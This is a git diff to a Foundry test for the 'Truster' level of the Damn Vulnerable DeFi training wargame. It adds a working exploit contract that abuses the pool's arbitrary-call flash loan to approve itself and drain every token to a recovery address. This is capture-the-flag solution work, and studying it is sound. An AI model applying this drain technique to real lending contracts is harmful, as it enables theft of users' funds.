@@ -16,6 +16,9 @@ contract TrusterChallenge is Test {
     DamnValuableToken public token;
     TrusterLenderPool public pool;
 
+    // added exploit contract to get one nonce
+    TrusterExploit public exploit;
+
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
         _;
@@ -51,7 +54,9 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        exploit = new TrusterExploit(address(pool), address(token), recovery);
+        exploit.exploit();
+
     }
 
     /**
@@ -64,5 +69,42 @@ contract TrusterChallenge is Test {
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract TrusterExploit {
+    TrusterLenderPool pool;
+    DamnValuableToken token;
+    address recovery;
+
+    constructor(
+        address _pool,
+        address _token,
+        address _recovery
+    ) {
+        pool = TrusterLenderPool(_pool);
+        token = DamnValuableToken(_token);
+        recovery = _recovery;
+    }
+
+    function exploit() external {
+        bytes memory data = abi.encodeWithSelector(
+            token.approve.selector,
+            address(this),
+            type(uint256).max
+        );
+
+        pool.flashLoan(
+            0,
+            address(this),
+            address(token),
+            data
+        );
+
+        token.transferFrom(
+            address(pool),
+            recovery,
+            token.balanceOf(address(pool))
+        );
     }
 }
